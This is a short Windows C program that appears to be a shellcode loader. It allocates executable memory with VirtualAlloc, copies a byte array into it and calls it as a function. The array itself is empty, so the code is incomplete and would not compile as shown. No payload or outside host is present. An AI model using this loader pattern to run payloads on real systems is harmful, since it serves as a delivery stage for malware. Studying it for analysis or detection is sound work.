# include <stdlib.h>
# include <stdio.h>
# include <string.h>
# include <windows.h>

int main(void)
{
unsigned char shellcode[] = \

;

  void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(exec, shellcode, sizeof shellcode);
  printf("strlen(shellcode)=%d\n", strlen(shellcode));
  system("pause");
  ((void (*)(void))exec)();

  return 0;
}
